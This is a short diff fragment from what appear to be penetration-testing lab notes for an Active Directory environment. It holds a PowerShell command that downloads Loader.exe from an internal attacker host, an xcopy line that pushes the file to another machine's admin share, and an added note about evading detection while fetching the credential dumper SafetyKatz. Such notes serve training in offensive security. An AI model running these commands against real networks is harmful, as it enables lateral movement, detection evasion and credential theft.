@@ -200,3 +200,4 @@ iwr http://172.16.99.115/Loader.exe -OutFile C:\Users\Public\Loader.exe
 ```powershell
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
+To avoid detection while download safetykatz 
